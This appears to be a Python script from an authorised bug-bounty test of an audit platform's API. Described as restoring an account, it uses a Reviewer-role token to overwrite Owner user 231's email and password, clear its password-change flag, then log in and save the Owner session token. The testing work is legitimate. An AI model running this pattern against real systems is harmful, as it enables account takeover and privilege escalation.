import json,subprocess,os
H=os.environ['H']; BB=os.environ['BB']
TR=open('/tmp/tok_Reviewer').read().strip()
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or TR),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
def login(email,pw):
    cmd=['curl','-s','-m','30','-o','/tmp/l','-w','%{http_code}','-X','POST',H+'/api/v1/users/login',
         '-H',BB,'-H','Content-Type: application/json','-d',json.dumps({"credentials":{"email":email,"password":pw}})]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/l',encoding='utf-8',errors='replace').read()
print("=== restore Owner 231: email + password + flag ===")
c,b=req('PUT','/api/v1/users/231',{"user":{"email":"golden-snow-4771@bugcrowdninja.com"}})
print("  email restore ->",c)
c,b=req('PUT','/api/v1/users/231',{"user":{"password":"Tester"}})
print("  password restore ->",c, b[:150].replace(chr(10),' '))
c,b=req('PUT','/api/v1/users/231',{"user":{"requires_password_change":False}})
print("  flag clear ->",c)
print("\n=== verify ===")
c,b=req('GET','/api/v1/users/231',tok=TR)
u=json.loads(b)['users'][0]
print(f"  email={u['email']!r} req_pw_change={u['requires_password_change']} role={u['role_id']}")
c,b=login("golden-snow-4771@bugcrowdninja.com","Tester")
print(f"  login with 'Tester' -> {c}")
if c=='200':
    s=json.loads(b)['session']; open('/tmp/tok_A','w').write(s['token'])
    print(f"  RESTORED id={s['id']} role={s['role_id']}")
